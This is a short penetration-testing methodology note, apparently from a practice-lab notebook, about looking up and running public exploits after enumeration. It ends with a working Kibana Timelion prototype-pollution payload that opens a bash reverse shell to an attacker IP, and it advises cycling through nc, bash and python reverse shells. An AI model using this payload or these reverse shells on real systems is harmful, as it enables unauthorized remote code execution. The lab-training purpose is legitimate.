# Methodology

After running enumeration and identifying a possible vulnerable service, we shold look everything up!

* [ ] If we have version number look it up on searchsplot
* [ ] If the exploit works perfect
* [ ] if it doesnt work maybe the reverse shell ur using does not work try different ways to get a callback, do nc, bash, python, and all these in different ways
* [ ] If the exploit is in the format of 'command', remember in order to make things work you have to do this in between ""

Take a look at this example&#x20;

![](<../../.gitbook/assets/image (79).png>)

Notice how in order to make bash understand that it is in quotations we place \ before " and before the last ".&#x20;

Also notice the format ' "and verything that requires " is in quotation marks in the middle'&#x20;

* [ ] If we try a couple and they dont work do not try to troubleshoot the exploit&#x20;
* [ ] look it up on github, someone might have already done something to the exploit
* [ ] if we do not have version number, fire all exploits prioritize rce over anything else and one will land i promise.
* [ ] if we do not have it on searchsploit just look it up on google, look what happened with sirol and kibana
* [ ] also cycle through open ports and see if it doesnt work and it is supposed to see if maybe the exploit needs to change the reverse shell method

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.242/5601 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Take a look at this example the exploit required us instead of executing a normal reverse shell we had so specify to bash -c to execute the reverse shell.
